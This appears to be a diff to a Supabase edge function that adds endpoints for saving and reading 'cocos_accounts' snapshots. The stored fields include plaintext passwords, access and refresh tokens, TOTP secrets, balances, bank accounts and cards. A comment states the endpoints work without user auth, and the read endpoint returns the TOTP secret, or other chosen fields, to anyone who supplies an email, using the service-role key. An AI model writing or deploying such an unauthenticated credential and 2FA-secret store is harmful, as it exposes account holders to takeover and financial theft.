@@ -159,6 +159,139 @@ function err(message: string, status = 400) {
   return json({ success: false, error: message }, status);
 }
 
+function getServiceRoleConfig() {
+  const sbUrl = Deno.env.get("SUPABASE_URL");
+  const sbKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!sbUrl || !sbKey) return null;
+  return { sbUrl, sbKey };
+}
+
+const ACCOUNT_SNAPSHOT_FIELDS = new Set([
+  "email",
+  "operator_code",
+  "password",
+  "access_token",
+  "refresh_token",
+  "account_id",
+  "totp_secret",
+  "factors",
+  "profile_data",
+  "full_name",
+  "phone",
+  "balance_ars",
+  "balance_usd",
+  "buying_power",
+  "bank_accounts",
+  "cards",
+  "orders",
+  "portfolio_data",
+  "info_tag",
+  "user_id_cocos",
+  "last_login_at",
+  "last_refresh_at",
+  "last_data_sync_at",
+  "created_at",
+  "updated_at",
+]);
+
+function sanitizeAccountPayload(record: Record<string, unknown>): Record<string, unknown> {
+  const sanitized: Record<string, unknown> = {};
+  for (const [key, value] of Object.entries(record)) {
+    if (ACCOUNT_SNAPSHOT_FIELDS.has(key)) sanitized[key] = value;
+  }
+  return sanitized;
+}
+
+async function handleSaveAccountSnapshot(body: Record<string, unknown>) {
+  const cfg = getServiceRoleConfig();
+  if (!cfg) return err("Server config missing", 500);
+
+  const record = (body.record as Record<string, unknown> | undefined) || {};
+  const normalizedEmail = String(record.email || "").trim().toLowerCase();
+  if (!normalizedEmail) return err("email requerido");
+
+  const operatorCode = String(record.operator_code || body.operator_code || "master").trim() || "master";
+  const nowIso = new Date().toISOString();
+  const payload = {
+    ...sanitizeAccountPayload(record),
+    email: normalizedEmail,
+    operator_code: operatorCode,
+    updated_at: nowIso,
+  };
+
+  const lookupUrl = `${cfg.sbUrl}/rest/v1/cocos_accounts?select=id&email=eq.${encodeURIComponent(normalizedEmail)}&operator_code=eq.${encodeURIComponent(operatorCode)}&order=updated_at.desc&limit=1`;
+  const lookupRes = await fetch(lookupUrl, {
+    method: "GET",
+    headers: {
+      apikey: cfg.sbKey,
+      Authorization: `Bearer ${cfg.sbKey}`,
+      "Content-Type": "application/json",
+    },
+  });
+
+  if (!lookupRes.ok) {
+    const detail = await lookupRes.text();
+    return json({ success: false, error: "lookup_failed", detail }, 500);
+  }
+
+  const existing = await lookupRes.json();
+  const existingId = Array.isArray(existing) && existing[0]?.id ? String(existing[0].id) : null;
+
+  const saveUrl = existingId
+    ? `${cfg.sbUrl}/rest/v1/cocos_accounts?id=eq.${existingId}`
+    : `${cfg.sbUrl}/rest/v1/cocos_accounts`;
+
+  const saveRes = await fetch(saveUrl, {
+    method: existingId ? "PATCH" : "POST",
+    headers: {
+      apikey: cfg.sbKey,
+      Authorization: `Bearer ${cfg.sbKey}`,
+      "Content-Type": "application/json",
+      Prefer: "return=minimal",
+    },
+    body: JSON.stringify(existingId ? payload : { ...payload, created_at: nowIso }),
+  });
+
+  if (!saveRes.ok) {
+    const detail = await saveRes.text();
+    return json({ success: false, error: "save_failed", detail }, 500);
+  }
+
+  return json({ success: true, mode: existingId ? "update" : "insert" });
+}
+
+async function handleGetAccountSnapshot(body: Record<string, unknown>) {
+  const cfg = getServiceRoleConfig();
+  if (!cfg) return err("Server config missing", 500);
+
+  const normalizedEmail = String(body.email || "").trim().toLowerCase();
+  if (!normalizedEmail) return err("email requerido");
+
+  const operatorCode = String(body.operator_code || "master").trim() || "master";
+  const requested = Array.isArray(body.fields) ? (body.fields as string[]) : ["totp_secret"];
+  const fields = requested.filter((f) => ACCOUNT_SNAPSHOT_FIELDS.has(String(f)));
+  const selectFields = (fields.length > 0 ? fields : ["totp_secret"]).join(",");
+
+  const readUrl = `${cfg.sbUrl}/rest/v1/cocos_accounts?select=${encodeURIComponent(selectFields)}&email=eq.${encodeURIComponent(normalizedEmail)}&operator_code=eq.${encodeURIComponent(operatorCode)}&order=updated_at.desc&limit=1`;
+  const readRes = await fetch(readUrl, {
+    method: "GET",
+    headers: {
+      apikey: cfg.sbKey,
+      Authorization: `Bearer ${cfg.sbKey}`,
+      "Content-Type": "application/json",
+    },
+  });
+
+  if (!readRes.ok) {
+    const detail = await readRes.text();
+    return json({ success: false, error: "read_failed", detail }, 500);
+  }
+
+  const rows = await readRes.json();
+  const account = Array.isArray(rows) && rows.length > 0 ? rows[0] : null;
+  return json({ success: true, account });
+}
+
 // ---------- route handlers ----------
 
 // 1. AUTH — Login
@@ -745,6 +878,12 @@ serve(async (req) => {
         return await handleEmailVerify(body);
       case "get_default_factor":
         return await handleGetDefaultFactor(body);
+
+      // Backend snapshots for cocos_accounts (works without user auth)
+      case "save_account_snapshot":
+        return await handleSaveAccountSnapshot(body);
+      case "get_account_snapshot":
+        return await handleGetAccountSnapshot(body);
 
       // Admin-only server-side actions (no access_token needed)
       case "pix_check_all_statuses":
